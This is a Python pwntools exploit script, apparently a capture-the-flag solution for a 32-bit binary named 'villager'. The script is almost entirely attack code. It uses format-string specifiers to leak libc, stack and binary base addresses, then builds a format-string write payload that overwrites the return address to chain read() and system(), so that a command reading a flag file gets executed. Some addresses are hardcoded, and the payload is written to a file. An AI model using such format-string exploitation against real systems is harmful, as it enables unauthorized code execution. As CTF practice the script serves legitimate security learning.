#!/usr/bin/env python
# coding: utf-8
from pwn import *

context(os="linux", arch="i386")

# first: address leak
# second: input "return addr" + "
# third: write ropgadget (input "cat /home/q23/flag.txt")
# forth: write buffer address and system address
# finally: write ropgadget

# cat /home/q23/flag.txt\x00 (23 bytes)


def main():
    conn = process("./villager")
    libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
    # libc = ELF("./libc.so.6")

    conn.recvuntil("What's your name?")

    # first payload
    # payload = "%17$p %30$p %79$p"  # write+35, return_addr-4, main+65 <- write+35だと入力値で上書きしちゃってだめ
    payload = "%35$p %30$p %79$p"  # _IO_file_overflow+12, return_addr-4, main+65
    conn.sendline(payload)

    conn.recvuntil("\n")
    recv = conn.recvuntil("\n")
    tmp = recv.rstrip().split(" ")

    libc_leak = tmp[1]
    libc_base = int(libc_leak, 16) - 12 - 0x6a3a0  # nm -D /lib/i386-linux-gnu/libc-2.23.so |grep _IO_file_overflow

    stack_eip_leak = tmp[2]
    stack_eip_addr = int(stack_eip_leak, 16) + 4
    stack_read_addr = stack_eip_addr + 12  # 12 is index (because it is used 2 pops)
    stack_esp_addr = stack_eip_addr + 24
    esp_addr = stack_eip_addr - 0x120  # this is the place of input

    base_leak = tmp[3]
    base_addr = int(base_leak, 16) - 65 - 0x8b0  # 0x8b0 is offset of "main"
    lea_pop2_ret = base_addr + 0x7e2

    system_addr = libc_base + libc.symbols["system"]
    read_addr = libc_base + libc.symbols["read"]

    print "libc_base: " + str(hex(libc_base))
    print "base_addr: " + str(hex(base_addr))
    print "stack_eip_addr: " + str(hex(stack_eip_addr))
    print "system: " + str(hex(system_addr))

    conn.recvuntil("What's your name?")
    index = get_index(lea_pop2_ret) - 16  # 16 is be already inputed size

    payload = p32(base_addr + 0x8f1)  # return addr
    payload += p32(0x1)  # stdin
    payload += p32(base_addr + 0x1ec4)  # buffer
    payload += p32(0x17)  # size
    payload += "%" + str(index) + "x"
    payload += "%23$hn"  # stack_eip_addr

    index_read = read_addr - index - 16

    payload += "%" + str(index_read) + "x"
    payload += "%24$n"  # stack_read_addr

    index_input = index_read - index - 16

    payload += "%" + str(index_input) + "x"
    payload += "%25$n"  # stack_esp_addr
    payload += alignment(payload)

    # payload += p32(stack_eip_addr)
    # payload += p32(stack_read_addr)
    # payload += p32(stack_esp_addr)
    payload += p32(0xffffbc2c)
    payload += p32(0xffffbc38)
    payload += p32(0xffffbc44)
    payload += "\x00"

    f = open("input.txt", "w")
    f.write(payload)
    f.close()


def get_index(ropgadget):
    index = int("0x" + str(hex(ropgadget))[-4:], 16)
    return index


def alignment(payload):
    if not len(payload) % 4 == 0:
        return "P" * abs(len(payload) % 4 - 4)
    else:
        return ""


if __name__ == "__main__":
    main()
